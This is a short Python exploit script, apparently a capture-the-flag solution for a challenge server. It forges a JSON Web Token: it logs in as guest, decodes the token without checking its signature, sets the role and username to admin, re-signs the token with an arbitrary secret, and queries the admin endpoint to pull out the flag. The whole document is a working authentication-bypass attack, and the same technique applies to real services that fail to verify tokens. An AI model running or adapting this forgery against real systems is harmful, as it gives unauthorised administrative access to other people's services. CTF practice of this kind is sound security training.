import requests
import jwt
import json

TARGET = "http://c1.arena.airoverflow.com:58585"

print("[*] Step 1: Login as guest to get a valid token structure")
r = requests.post(f"{TARGET}/api/login", json={"username": "guest", "password": "guest123"})
print(f"[+] Login response: {r.status_code}")
data = r.json()
print(f"[+] Token received: {data['token'][:50]}...")

original_token = data['token']

# Decode without verification to see the structure
print("\n[*] Step 2: Decode token to see payload")
decoded = jwt.decode(original_token, options={"verify_signature": False})
print(f"[+] Original payload: {decoded}")

# Modify role to admin
print("\n[*] Step 3: Modify role to 'admin' (no verification needed!)")
decoded['role'] = 'admin'
decoded['username'] = 'admin'

# Since verify_token() does nothing, we can use ANY signature
# Just re-encode with a dummy secret
forged_token = jwt.encode(decoded, "any_secret", algorithm="HS256")
print(f"[+] Forged token: {forged_token[:50]}...")

# Access admin endpoint
print("\n[*] Step 4: Access /api/admin with forged token")
headers = {"Authorization": f"Bearer {forged_token}"}
r = requests.get(f"{TARGET}/api/admin", headers=headers)

print(f"[+] Response status: {r.status_code}")
print(f"[+] Response: {r.text}")

if r.status_code == 200:
    import re
    flags = re.findall(r'ARENA\{[^}]+\}', r.text)
    if flags:
        print(f"\n{'='*70}")
        print(f"[!] FLAG FOUND: {flags[0]}")
        print(f"{'='*70}")
